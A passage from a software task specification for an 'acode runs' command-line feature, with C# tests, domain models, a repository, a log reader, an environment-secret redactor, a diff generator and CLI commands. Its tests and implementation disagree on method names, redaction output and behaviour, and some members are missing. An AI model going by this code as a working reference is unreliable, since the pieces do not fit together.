    public async Task Handle_WithNonExistentRunId_ReturnsNull()
    {
        // Arrange
        var runId = new RunId("run-nonexistent");
        _repository.GetByIdAsync(runId).Returns((RunDetails)null);
        _repository.FindByPartialIdAsync("run-nonexistent").Returns(new List<RunId>());

        var query = new GetRunQuery { RunId = "run-nonexistent" };

        // Act
        var result = await _handler.Handle(query, CancellationToken.None);

        // Assert
        result.Should().BeNull();
    }
}

public class EnvironmentRedactorTests
{
    private readonly EnvironmentRedactor _redactor = new();

    [Theory]
    [InlineData("API_KEY", "sk-abc123def456", "***REDACTED***")]
    [InlineData("PASSWORD", "secret123", "***REDACTED***")]
    [InlineData("SECRET_TOKEN", "token-xyz", "***REDACTED***")]
    [InlineData("DATABASE_URL", "postgres://user:pass@host/db", "postgres://user:***REDACTED***@host/db")]
    [InlineData("PATH", "/usr/bin:/usr/local/bin", "/usr/bin:/usr/local/bin")] // Not redacted
    public void RedactValue_WithVariousKeys_RedactsSecrets(string key, string value, string expected)
    {
        // Act
        var result = _redactor.RedactValue(key, value);

        // Assert
        result.Should().Be(expected);
    }

    [Fact]
    public void RedactEnvironment_WithMultipleSecrets_RedactsAll()
    {
        // Arrange
        var environment = new Dictionary<string, string>
        {
            ["PATH"] = "/usr/bin",
            ["API_KEY"] = "sk-abc123",
            ["PASSWORD"] = "secret",
            ["USER"] = "developer"
        };

        // Act
        var redacted = _redactor.RedactEnvironment(environment);

        // Assert
        redacted["PATH"].Should().Be("/usr/bin");
        redacted["API_KEY"].Should().Be("***REDACTED***");
        redacted["PASSWORD"].Should().Be("***REDACTED***");
        redacted["USER"].Should().Be("developer");
    }
}

public class UnifiedDiffGeneratorTests
{
    private readonly UnifiedDiffGenerator _generator = new();

    [Fact]
    public async Task GenerateAsync_WithIdenticalContent_ReturnsNoDifferences()
    {
        // Arrange
        var lines1 = new[] { "line1", "line2", "line3" }.ToAsyncEnumerable();
        var lines2 = new[] { "line1", "line2", "line3" }.ToAsyncEnumerable();

        // Act
        var diff = await _generator.GenerateAsync(lines1, lines2, context: 3).ToListAsync();

        // Assert
        diff.Should().BeEmpty();
    }

    [Fact]
    public async Task GenerateAsync_WithAddedLines_ReturnsAddedDiffLines()
    {
        // Arrange
        var lines1 = new[] { "line1", "line2" }.ToAsyncEnumerable();
        var lines2 = new[] { "line1", "line2", "line3" }.ToAsyncEnumerable();

        // Act
        var diff = await _generator.GenerateAsync(lines1, lines2, context: 3).ToListAsync();

        // Assert
        diff.Should().Contain(d => d.Type == DiffLineType.Added && d.Content == "line3");
    }

    [Fact]
    public async Task GenerateAsync_WithRemovedLines_ReturnsRemovedDiffLines()
    {
        // Arrange
        var lines1 = new[] { "line1", "line2", "line3" }.ToAsyncEnumerable();
        var lines2 = new[] { "line1", "line2" }.ToAsyncEnumerable();

        // Act
        var diff = await _generator.GenerateAsync(lines1, lines2, context: 3).ToListAsync();

        // Assert
        diff.Should().Contain(d => d.Type == DiffLineType.Removed && d.Content == "line3");
    }

    [Fact]
    public async Task GenerateAsync_WithChangedLines_ReturnsBothRemovedAndAdded()
    {
        // Arrange
        var lines1 = new[] { "line1", "oldline", "line3" }.ToAsyncEnumerable();
        var lines2 = new[] { "line1", "newline", "line3" }.ToAsyncEnumerable();

        // Act
        var diff = await _generator.GenerateAsync(lines1, lines2, context: 3).ToListAsync();

        // Assert
        diff.Should().Contain(d => d.Type == DiffLineType.Removed && d.Content == "oldline");
        diff.Should().Contain(d => d.Type == DiffLineType.Added && d.Content == "newline");
    }
}
```

### Integration Tests (Key Test Cases)

```csharp
using Xunit;
using FluentAssertions;
using Microsoft.Extensions.DependencyInjection;

namespace Acode.Infrastructure.Tests.Runs;

[Collection("Database")]
public class RunRepositoryIntegrationTests : IAsyncLifetime
{
    private readonly ServiceProvider _services;
    private readonly IRunRepository _repository;
    private readonly string _testDbPath;

    public RunRepositoryIntegrationTests()
    {
        _testDbPath = Path.Combine(Path.GetTempPath(), $"test-{Guid.NewGuid()}.db");
        _services = new ServiceCollection()
            .AddSingleton<IDbConnection>(new SqliteConnection($"Data Source={_testDbPath}"))
            .AddScoped<IRunRepository, RunRepository>()
            .BuildServiceProvider();

        _repository = _services.GetRequiredService<IRunRepository>();
    }

    [Fact]
    public async Task ListAsync_WithPopulatedDatabase_ReturnsRunsOrderedByStartTime()
    {
        // Arrange
        await SeedTestRunsAsync();

        var filters = new RunListFilters { Limit = 10, SortBy = "started_at", SortOrder = SortOrder.Descending };

        // Act
        var runs = await _repository.ListAsync(filters);

        // Assert
        runs.Should().HaveCount(3);
        runs.Should().BeInDescendingOrder(r => r.StartTime);
    }

    [Fact]
    public async Task GetByIdAsync_WithExistingRun_ReturnsCompleteDetails()
    {
        // Arrange
        var runId = await SeedTestRunAsync("run-integration-test");

        // Act
        var run = await _repository.GetByIdAsync(runId);

        // Assert
        run.Should().NotBeNull();
        run.Id.Should().Be(runId);
        run.Environment.Should().ContainKey("PATH");
        run.Artifacts.Should().NotBeEmpty();
    }

    [Fact]
    public async Task FindByPartialIdAsync_WithPrefix_ReturnsMatchingRuns()
    {
        // Arrange
        await SeedTestRunAsync("run-abc123-build");
        await SeedTestRunAsync("run-abc456-build");
        await SeedTestRunAsync("run-xyz789-test");

        // Act
        var matches = await _repository.FindByPartialIdAsync("abc");

        // Assert
        matches.Should().HaveCount(2);
        matches.Should().AllSatisfy(id => id.Value.Should().StartWith("run-abc"));
    }

    private async Task SeedTestRunsAsync()
    {
        await SeedTestRunAsync("run-001-build");
        await SeedTestRunAsync("run-002-test");
        await SeedTestRunAsync("run-003-deploy");
    }

    private async Task<RunId> SeedTestRunAsync(string runId)
    {
        var run = new RunRecord
        {
            Id = runId,
            TaskName = "test-task",
            StartTime = DateTimeOffset.Now,
            EndTime = DateTimeOffset.Now.AddMinutes(5),
            ExitCode = 0,
            Status = RunStatus.Success,
            Command = "test command",
            WorkingDirectory = "/workspace",
            OperatingMode = "LocalOnly",
            Environment = new Dictionary<string, string> { ["PATH"] = "/usr/bin" }
        };

        await _repository.CreateAsync(run);
        return new RunId(runId);
    }

    public Task InitializeAsync() => Task.CompletedTask;

    public async Task DisposeAsync()
    {
        await _services.DisposeAsync();
        if (File.Exists(_testDbPath))
            File.Delete(_testDbPath);
    }
}
```

---

## User Verification Steps

1. **Verify list displays runs:**
   ```bash
   acode runs list
   ```
   Verify: Table shows run ID, timestamp, exit code, command

2. **Verify limit filter:**
   ```bash
   acode runs list --limit 5
   ```
   Verify: Exactly 5 runs displayed

3. **Verify status filter:**
   ```bash
   acode runs list --status failed
   ```
   Verify: Only non-zero exit code runs shown

4. **Verify show displays details:**
   ```bash
   acode runs show {run-id}
   ```
   Verify: Full run metadata displayed

5. **Verify partial ID:**
   ```bash
   acode runs show {first-8-chars}
   ```
   Verify: Run found with partial match

6. **Verify environment redaction:**
   ```bash
   acode runs show {run-id}
   ```
   Verify: PASSWORD variables show ********

7. **Verify logs display:**
   ```bash
   acode runs logs {run-id}
   ```
   Verify: Stdout and stderr displayed with prefixes

8. **Verify tail option:**
   ```bash
   acode runs logs {run-id} --tail 10
   ```
   Verify: Only last 10 lines shown

9. **Verify diff output:**
   ```bash
   acode runs diff {run-1} {run-2}
   ```
   Verify: Unified diff format with +/- prefixes

10. **Verify JSON output:**
    ```bash
    acode runs list --format json
    ```
    Verify: Valid JSON array returned

---

## Implementation Prompt

### File Structure

```
src/
├── Acode.Domain/
│   └── Runs/
│       ├── RunId.cs
│       ├── RunSummary.cs
│       ├── RunDetails.cs
│       ├── RunStatus.cs
│       └── IRunRepository.cs
├── Acode.Application/
│   └── Runs/
│       └── Queries/
│           ├── ListRunsQuery.cs
│           ├── GetRunQuery.cs
│           ├── GetRunLogsQuery.cs
│           └── DiffRunsQuery.cs
├── Acode.Infrastructure/
│   └── Runs/
│       ├── RunRepository.cs
│       ├── ArtifactReader.cs
│       ├── EnvironmentRedactor.cs
│       └── UnifiedDiffGenerator.cs
└── Acode.Cli/
    └── Commands/
        └── Runs/
            ├── RunsListCommand.cs
            ├── RunsShowCommand.cs
            ├── RunsLogsCommand.cs
            └── RunsDiffCommand.cs
```

### Domain Models

```csharp
// RunId.cs
namespace Acode.Domain.Runs;

public readonly record struct RunId
{
    public string Value { get; }
    
    public RunId(string value)
    {
        ArgumentException.ThrowIfNullOrWhiteSpace(value);
        Value = value;
    }
    
    public static implicit operator string(RunId id) => id.Value;
    public override string ToString() => Value;
    
    public bool MatchesPartial(string partial) =>
        Value.StartsWith(partial, StringComparison.OrdinalIgnoreCase);
}

// RunSummary.cs
namespace Acode.Domain.Runs;

public sealed record RunSummary
{
    public required RunId Id { get; init; }
    public required DateTimeOffset StartTime { get; init; }
    public required int ExitCode { get; init; }
    public required string CommandPreview { get; init; }
    public required RunStatus Status { get; init; }
    public TimeSpan? Duration { get; init; }
}

// RunDetails.cs
namespace Acode.Domain.Runs;

public sealed record RunDetails
{
    public required RunId Id { get; init; }
    public required string TaskName { get; init; }
    public required DateTimeOffset StartTime { get; init; }
    public required DateTimeOffset EndTime { get; init; }
    public required TimeSpan Duration { get; init; }
    public required int ExitCode { get; init; }
    public required RunStatus Status { get; init; }
    public required string Command { get; init; }
    public required string WorkingDirectory { get; init; }
    public required string OperatingMode { get; init; }
    public string? ContainerId { get; init; }
    public IReadOnlyDictionary<string, string> Environment { get; init; } = 
        new Dictionary<string, string>();
    public IReadOnlyList<ArtifactInfo> Artifacts { get; init; } = 
        Array.Empty<ArtifactInfo>();
}

public sealed record ArtifactInfo
{
    public required string FileName { get; init; }
    public required string Path { get; init; }
    public required bool Exists { get; init; }
    public long? SizeBytes { get; init; }
}

// RunStatus.cs
namespace Acode.Domain.Runs;

public enum RunStatus
{
    Running,
    Success,
    Failure,
    Cancelled,
    TimedOut
}

// IRunRepository.cs
namespace Acode.Domain.Runs;

public interface IRunRepository
{
    Task<IReadOnlyList<RunSummary>> ListAsync(
        RunListFilter filter,
        CancellationToken cancellationToken = default);
    
    Task<RunDetails?> GetAsync(
        RunId id,
        CancellationToken cancellationToken = default);
    
    Task<IReadOnlyList<RunDetails>> GetByPartialIdAsync(
        string partialId,
        CancellationToken cancellationToken = default);
    
    Task<int> CountAsync(CancellationToken cancellationToken = default);
}

// RunListFilter.cs
namespace Acode.Domain.Runs;

public sealed record RunListFilter
{
    public int Limit { get; init; } = 20;
    public DateTimeOffset? Since { get; init; }
    public DateTimeOffset? Until { get; init; }
    public RunStatus? Status { get; init; }
    public string? CommandPattern { get; init; }
    public SortOrder Order { get; init; } = SortOrder.Descending;
}

public enum SortOrder
{
    Ascending,
    Descending
}
```

### Infrastructure Implementation

```csharp
// RunRepository.cs
namespace Acode.Infrastructure.Runs;

public sealed class RunRepository : IRunRepository
{
    private readonly IWorkspaceDb _db;
    private readonly ILogger<RunRepository> _logger;
    
    public RunRepository(IWorkspaceDb db, ILogger<RunRepository> logger)
    {
        _db = db;
        _logger = logger;
    }
    
    public async Task<IReadOnlyList<RunSummary>> ListAsync(
        RunListFilter filter,
        CancellationToken cancellationToken = default)
    {
        var query = @"
            SELECT run_id, start_time, exit_code, command, status, duration_ms
            FROM runs
            WHERE (@since IS NULL OR start_time >= @since)
              AND (@until IS NULL OR start_time <= @until)
              AND (@status IS NULL OR status = @status)
              AND (@pattern IS NULL OR command LIKE @pattern)
            ORDER BY start_time DESC
            LIMIT @limit";
        
        var parameters = new
        {
            since = filter.Since?.ToString("O"),
            until = filter.Until?.ToString("O"),
            status = filter.Status?.ToString(),
            pattern = filter.CommandPattern != null ? $"%{filter.CommandPattern}%" : null,
            limit = filter.Limit
        };
        
        var results = await _db.QueryAsync<RunRow>(query, parameters, cancellationToken);
        
        return results.Select(r => new RunSummary
        {
            Id = new RunId(r.RunId),
            StartTime = DateTimeOffset.Parse(r.StartTime),
            ExitCode = r.ExitCode,
            CommandPreview = TruncateCommand(r.Command, 60),
            Status = Enum.Parse<RunStatus>(r.Status),
            Duration = r.DurationMs.HasValue 
                ? TimeSpan.FromMilliseconds(r.DurationMs.Value) 
                : null
        }).ToList();
    }
    
    public async Task<IReadOnlyList<RunDetails>> GetByPartialIdAsync(
        string partialId,
        CancellationToken cancellationToken = default)
    {
        var query = @"
            SELECT * FROM runs
            WHERE run_id LIKE @pattern
            ORDER BY start_time DESC
            LIMIT 10";
        
        var results = await _db.QueryAsync<RunRow>(
            query, 
            new { pattern = $"{partialId}%" }, 
            cancellationToken);
        
        return results.Select(MapToDetails).ToList();
    }
    
    private static string TruncateCommand(string command, int maxLength)
    {
        if (command.Length <= maxLength) return command;
        return string.Concat(command.AsSpan(0, maxLength - 3), "...");
    }
}

// ArtifactReader.cs
namespace Acode.Infrastructure.Runs;

public sealed class ArtifactReader : IArtifactReader
{
    private readonly IArtifactPathResolver _pathResolver;
    private readonly IFileSystem _fileSystem;
    
    public async IAsyncEnumerable<string> StreamLinesAsync(
        RunId runId,
        string filename,
        int? tail = null,
        int? head = null,
        [EnumeratorCancellation] CancellationToken cancellationToken = default)
    {
        var path = _pathResolver.GetArtifactPath(runId.Value, filename);
        
        if (!_fileSystem.File.Exists(path))
        {
            yield break;
        }
        
        // Check for binary content
        if (await IsBinaryAsync(path, cancellationToken))
        {
            throw new BinaryContentException($"File {filename} contains binary content");
        }
        
        if (tail.HasValue)
        {
            await foreach (var line in TailLinesAsync(path, tail.Value, cancellationToken))
            {
                yield return line;
            }
        }
        else if (head.HasValue)
        {
            var count = 0;
            await foreach (var line in ReadLinesAsync(path, cancellationToken))
            {
                if (count++ >= head.Value) break;
                yield return line;
            }
        }
        else
        {
            await foreach (var line in ReadLinesAsync(path, cancellationToken))
            {
                yield return line;
            }
        }
    }
    
    private async Task<bool> IsBinaryAsync(string path, CancellationToken ct)
    {
        var buffer = new byte[8192];
        await using var stream = _fileSystem.File.OpenRead(path);
        var bytesRead = await stream.ReadAsync(buffer, ct);
        
        return buffer.Take(bytesRead).Any(b => b == 0);
    }
    
    private async IAsyncEnumerable<string> TailLinesAsync(
        string path,
        int lineCount,
        [EnumeratorCancellation] CancellationToken ct)
    {
        var lines = new Queue<string>(lineCount);
        
        await foreach (var line in ReadLinesAsync(path, ct))
        {
            lines.Enqueue(line);
            if (lines.Count > lineCount)
            {
                lines.Dequeue();
            }
        }
        
        foreach (var line in lines)
        {
            yield return line;
        }
    }
    
    private async IAsyncEnumerable<string> ReadLinesAsync(
        string path,
        [EnumeratorCancellation] CancellationToken ct)
    {
        await using var stream = _fileSystem.File.OpenRead(path);
        using var reader = new StreamReader(stream, Encoding.UTF8, 
            detectEncodingFromByteOrderMarks: true, 
            bufferSize: 65536, 
            leaveOpen: true);
        
        while (!reader.EndOfStream && !ct.IsCancellationRequested)
        {
            var line = await reader.ReadLineAsync(ct);
            if (line is not null)
            {
                yield return line;
            }
        }
    }
}

// EnvironmentRedactor.cs
namespace Acode.Infrastructure.Runs;

public sealed class EnvironmentRedactor : IEnvironmentRedactor
{
    private readonly IReadOnlyList<string> _patterns;
    private const string RedactedValue = "********";
    
    public EnvironmentRedactor(IOptions<RedactionConfig> config)
    {
        _patterns = config.Value.Patterns ?? new[]
        {
            "PASSWORD", "SECRET", "KEY", "TOKEN", "API_KEY",
            "APIKEY", "CREDENTIAL", "PRIVATE", "AUTH"
        };
    }
    
    public IReadOnlyDictionary<string, string> Redact(
        IReadOnlyDictionary<string, string> environment)
    {
        var redacted = new Dictionary<string, string>(environment.Count);
        
        foreach (var (key, value) in environment)
        {
            var shouldRedact = _patterns.Any(p => 
                key.Contains(p, StringComparison.OrdinalIgnoreCase) ||
                value.Contains(p, StringComparison.OrdinalIgnoreCase));
            
            redacted[key] = shouldRedact ? RedactedValue : value;
        }
        
        return redacted;
    }
}

// UnifiedDiffGenerator.cs
namespace Acode.Infrastructure.Runs;

public sealed class UnifiedDiffGenerator : IDiffGenerator
{
    public async IAsyncEnumerable<DiffLine> GenerateAsync(
        IAsyncEnumerable<string> linesA,
        IAsyncEnumerable<string> linesB,
        int contextLines = 3,
        [EnumeratorCancellation] CancellationToken ct = default)
    {
        var listA = await linesA.ToListAsync(ct);
        var listB = await linesB.ToListAsync(ct);
        
        var diff = new MyersDiff<string>(listA, listB);
        
        foreach (var hunk in diff.GetHunks(contextLines))
        {
            yield return new DiffLine(DiffLineType.HunkHeader, hunk.Header);
            
            foreach (var line in hunk.Lines)
            {
                yield return line;
            }
        }
    }
}

public sealed record DiffLine(DiffLineType Type, string Content);

public enum DiffLineType
{
    Context,
    Added,
    Removed,
    HunkHeader
}
```

### CLI Commands

```csharp
// RunsListCommand.cs
namespace Acode.Cli.Commands.Runs;

[Command("runs list", Description = "List execution runs")]
public class RunsListCommand
{
    [Option("--limit", Description = "Maximum runs to display")]
    public int Limit { get; set; } = 20;
    
    [Option("--since", Description = "Filter runs after date (ISO 8601 or relative)")]
    public string? Since { get; set; }
    
    [Option("--status", Description = "Filter by status (success, failed)")]
    public string? Status { get; set; }
    
    [Option("--format", Description = "Output format (table, json)")]
    public string Format { get; set; } = "table";
    
    public async Task<int> ExecuteAsync(
        IRunRepository repository,
        IConsole console,
        CancellationToken ct)
    {
        var filter = new RunListFilter
        {
            Limit = Limit,
            Since = ParseDate(Since),
            Status = ParseStatus(Status)
        };
        
        var runs = await repository.ListAsync(filter, ct);
        
        if (Format == "json")
        {
            console.WriteLine(JsonSerializer.Serialize(runs, JsonOptions.Pretty));
        }
        else
        {
            RenderTable(console, runs);
        }
        
        return 0;
    }
    
    private void RenderTable(IConsole console, IReadOnlyList<RunSummary> runs)
    {
        console.WriteLine("RUN ID            STARTED              STATUS   EXIT  COMMAND");
        console.WriteLine(new string('-', 80));
        
        foreach (var run in runs)
        {
            var status = run.Status == RunStatus.Success ? "✓" : "✗";
            console.WriteLine(
                $"{run.Id.Value,-17} {run.StartTime:yyyy-MM-dd HH:mm}  {status,-8} {run.ExitCode,4}  {run.CommandPreview}");
        }
        
        if (runs.Count == 0)
        {
            console.WriteLine("No runs found.");
        }
    }
}

// RunsLogsCommand.cs
namespace Acode.Cli.Commands.Runs;

[Command("runs logs", Description = "Display run output logs")]
public class RunsLogsCommand
{
    [Argument(0, Description = "Run ID")]
    public string RunId { get; set; } = "";
    
    [Option("--stdout", Description = "Show only stdout")]
    public bool StdoutOnly { get; set; }
    
    [Option("--stderr", Description = "Show only stderr")]
    public bool StderrOnly { get; set; }
    
    [Option("--tail", Description = "Show last N lines")]
    public int? Tail { get; set; }
    
    [Option("--no-prefix", Description = "Omit stream prefixes")]
    public bool NoPrefix { get; set; }
    
    public async Task<int> ExecuteAsync(
        IRunRepository repository,
        IArtifactReader artifactReader,
        IConsole console,
        CancellationToken ct)
    {
        var run = await ResolveRunAsync(repository, RunId, ct);
        if (run is null)
        {
            console.Error.WriteLine($"Run not found: {RunId}");
            return 1;
        }
        
        var streams = GetStreamsToShow();
        
        foreach (var (stream, prefix) in streams)
        {
            var filename = stream == "stdout" ? "stdout.txt" : "stderr.txt";
            
            await foreach (var line in artifactReader.StreamLinesAsync(
                run.Id, filename, Tail, null, ct))
            {
                var output = NoPrefix ? line : $"[{prefix}] {line}";
                console.WriteLine(output);
            }
        }
        
        return 0;
    }
    
    private IEnumerable<(string stream, string prefix)> GetStreamsToShow()
    {
        if (StdoutOnly) return new[] { ("stdout", "stdout") };
        if (StderrOnly) return new[] { ("stderr", "stderr") };
        return new[] { ("stdout", "stdout"), ("stderr", "stderr") };
    }
}

// RunsDiffCommand.cs
namespace Acode.Cli.Commands.Runs;

[Command("runs diff", Description = "Compare two runs")]
public class RunsDiffCommand
{
    [Argument(0, Description = "First run ID")]
    public string RunId1 { get; set; } = "";
    
    [Argument(1, Description = "Second run ID")]
    public string RunId2 { get; set; } = "";
    
    [Option("--context", Description = "Context lines")]
    public int Context { get; set; } = 3;
    
    [Option("--color")]
    public bool Color { get; set; } = true;
    
    public async Task<int> ExecuteAsync(
        IRunRepository repository,
        IArtifactReader artifactReader,
        IDiffGenerator diffGenerator,
        IConsole console,
        CancellationToken ct)
    {
        var run1 = await ResolveRunAsync(repository, RunId1, ct);
        var run2 = await ResolveRunAsync(repository, RunId2, ct);
        
        if (run1 is null || run2 is null)
        {
            console.Error.WriteLine("One or both runs not found");
            return 2;
        }
        
        // Exit code comparison
        console.WriteLine($"Exit Code: {run1.ExitCode} → {run2.ExitCode}");
        console.WriteLine($"Duration:  {run1.Duration} → {run2.Duration}");
        console.WriteLine();
        
        // Stdout diff
        console.WriteLine("=== stdout ===");
        var stdout1 = artifactReader.StreamLinesAsync(run1.Id, "stdout.txt", ct: ct);
        var stdout2 = artifactReader.StreamLinesAsync(run2.Id, "stdout.txt", ct: ct);
        
        var hasDiff = false;
        await foreach (var line in diffGenerator.GenerateAsync(stdout1, stdout2, Context, ct))
        {
            hasDiff = true;
            console.WriteLine(FormatDiffLine(line, Color));
        }
        
        return hasDiff || run1.ExitCode != run2.ExitCode ? 1 : 0;
    }
    
    private string FormatDiffLine(DiffLine line, bool color)
    {
        var prefix = line.Type switch
        {
            DiffLineType.Added => "+",
            DiffLineType.Removed => "-",
            DiffLineType.HunkHeader => "@@",
            _ => " "
        };
        
        var text = $"{prefix}{line.Content}";
        
        if (!color) return text;
        
        return line.Type switch
        {
            DiffLineType.Added => $"\u001b[32m{text}\u001b[0m",
            DiffLineType.Removed => $"\u001b[31m{text}\u001b[0m",
            DiffLineType.HunkHeader => $"\u001b[36m{text}\u001b[0m",
            _ => text
        };
    }
}
```

### Error Codes

| Code | Meaning | Recovery |
|------|---------|----------|
| 0 | Success / Runs identical (diff) | N/A |
| 1 | Run not found / Runs differ (diff) | Check run ID, list runs |
| 2 | Invalid arguments / Missing artifacts | Check command syntax |
| 3 | Database error | Check DB integrity |
| ACODE-RUN-001 | Run ID not found | Verify run ID with `runs list` |
| ACODE-RUN-002 | Partial ID ambiguous | Use more characters |
| ACODE-RUN-003 | Artifact file missing | Run may not have captured output |
| ACODE-RUN-004 | Binary content detected | Use external tool for binary |
| ACODE-RUN-005 | Database connection failed | Check workspace DB |

### Implementation Checklist

- [ ] Create domain models for RunId, RunSummary, RunDetails
- [ ] Implement IRunRepository interface
- [ ] Implement RunRepository with SQLite queries
- [ ] Implement IArtifactReader for streaming logs
- [ ] Implement EnvironmentRedactor with configurable patterns
- [ ] Implement UnifiedDiffGenerator for diff output
- [ ] Create RunsListCommand with filtering options
- [ ] Create RunsShowCommand with format options
- [ ] Create RunsLogsCommand with tail/head support
- [ ] Create RunsDiffCommand with color output
- [ ] Add --help for all commands
- [ ] Add unit tests for repository queries
- [ ] Add unit tests for date parsing
- [ ] Add unit tests for redaction
- [ ] Add integration tests for DB queries
- [ ] Add E2E tests for CLI commands
- [ ] Performance test with 10000 runs
- [ ] Document all commands in user manual

### Rollout Plan

| Phase | Action | Validation |
|-------|--------|------------|
| 1 | Implement domain models | Unit tests pass |
| 2 | Implement RunRepository | Query tests pass |
| 3 | Implement ArtifactReader | Streaming tests pass |
| 4 | Implement runs list command | List E2E tests pass |
| 5 | Implement runs show command | Show E2E tests pass |
| 6 | Implement runs logs command | Logs E2E tests pass |
| 7 | Implement runs diff command | Diff E2E tests pass |
| 8 | Performance testing | <100ms for 10000 runs |
| 9 | Documentation and release | User manual complete |

---

**End of Task 021.b Specification**